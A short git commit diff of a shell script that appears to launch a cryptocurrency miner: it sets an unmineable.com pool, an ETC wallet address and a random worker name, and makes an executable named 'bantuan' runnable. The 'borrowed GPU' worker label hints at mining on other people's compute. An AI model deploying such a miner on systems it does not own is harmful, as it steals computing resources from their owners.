ecb0f9311245bb78ba36e997d28fae30b32d0d0e
motoceli <86542945+motoceli@users.noreply.github.com>
2021-07-25 09:17:10 +0700

    Update data.sh

--- data.sh
+++ data.sh
@@ -2,7 +2,7 @@ POOL=ethash.unmineable.com:3333
 
 WALLET=ETC:0xc1a48c0ff1d28c85685e3eabd55d19f12327e139
 
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Volkath)
 
 chmod +x bantuan
 
